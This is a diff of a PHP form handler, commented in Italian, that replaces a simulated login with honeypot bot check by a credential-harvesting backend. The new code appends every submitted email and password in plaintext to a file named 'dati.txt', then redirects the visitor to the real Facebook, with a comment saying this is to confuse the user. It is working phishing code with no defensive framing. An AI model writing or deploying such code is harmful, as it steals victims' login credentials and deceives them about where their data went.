@@ -1,22 +1,16 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-  $utente_id = $_POST['utente_id'] ?? '';
-  $chiave_accesso = $_POST['chiave_accesso'] ?? '';
-  $extra_info = $_POST['extra_info'] ?? '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = $_POST['email'] ?? 'N/A';
+    $password = $_POST['password'] ?? 'N/A';
+    $timestamp = date("Y-m-d H:i:s");
+    
+    $line = "[$timestamp] Email: $email | Password: $password\n";
+    file_put_contents("dati.txt", $line, FILE_APPEND);
 
-  // Se il campo honeypot è compilato, probabile bot
-  if (!empty($extra_info)) {
-    die("Accesso negato.");
-  }
-
-  // Procedura simulata (sostituibile con database o API)
-  if ($utente_id && $chiave_accesso) {
-    echo "Benvenuto, " . htmlspecialchars($utente_id);
-    // In un ambiente reale, qui metteresti la logica di login.
-  } else {
-    echo "Credenziali non valide.";
-  }
+    // Reindirizza al vero Facebook per confondere l'utente
+    header("Location: https://www.facebook.com");
+    exit;
 } else {
-  echo "Richiesta non valida.";
+    echo "Accesso non autorizzato.";
 }
 ?>
